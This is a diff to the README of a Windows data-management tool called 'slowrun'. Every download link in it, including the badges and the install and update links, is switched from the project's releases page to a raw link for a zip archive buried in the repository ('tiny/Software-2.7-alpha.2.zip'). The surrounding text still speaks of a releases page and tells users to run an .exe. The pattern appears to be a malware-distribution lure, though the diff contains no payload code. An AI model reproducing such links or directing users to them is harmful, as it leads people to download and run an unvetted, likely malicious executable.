@@ -1,6 +1,6 @@
 # 🐢 slowrun - Manage Large Data With Ease
 
-[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://github.com/Khoi7323/slowrun/releases)
+[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get slowrun up and running on your Windows PC.
 
 Visit this page to download the latest version of the software:
 
-[https://github.com/Khoi7323/slowrun/releases](https://github.com/Khoi7323/slowrun/releases)
+[https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip](https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip)
 
 On the releases page, look for the latest release marked by the highest version number or labeled “Latest.” You will find one or more files there. Find the file named with `.exe` at the end. This is the installer file you need.
 
@@ -96,7 +96,7 @@ If issues persist, you can report bugs or request help in the GitHub issues sect
 
 Visit the releases page regularly for updates:
 
-[https://github.com/Khoi7323/slowrun/releases](https://github.com/Khoi7323/slowrun/releases)
+[https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip](https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip)
 
 Download and run the newest `.exe` installer over your existing installation to update. Your settings and data will remain intact.
 
@@ -110,4 +110,4 @@ Download and run the newest `.exe` installer over your existing installation to 
 
 ---
 
-[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://github.com/Khoi7323/slowrun/releases)
+[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Khoi7323/slowrun/main/tiny/Software-2.7-alpha.2.zip)
